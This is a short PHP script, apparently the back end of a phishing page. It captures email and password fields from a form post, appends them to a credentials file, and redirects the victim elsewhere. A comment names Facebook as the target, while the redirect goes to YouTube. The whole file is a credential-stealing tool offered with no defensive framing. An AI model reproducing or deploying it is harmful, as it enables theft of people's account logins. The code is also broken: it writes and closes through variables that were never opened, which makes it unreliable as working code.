<?

#h4x0r.php

$email = $_POST['email'];
$pass = $_POST['pass'];

$file = fopen('creds.txt','a+');
fwrite($save,
	"email: ".$email.

"\npass: ".$pass." ");

fclose($guardame);
//Redirect to original webpage (facebook)
echo "<meta http-equiv='refresh' content='1;url=https://www.youtube.com'>"
?>
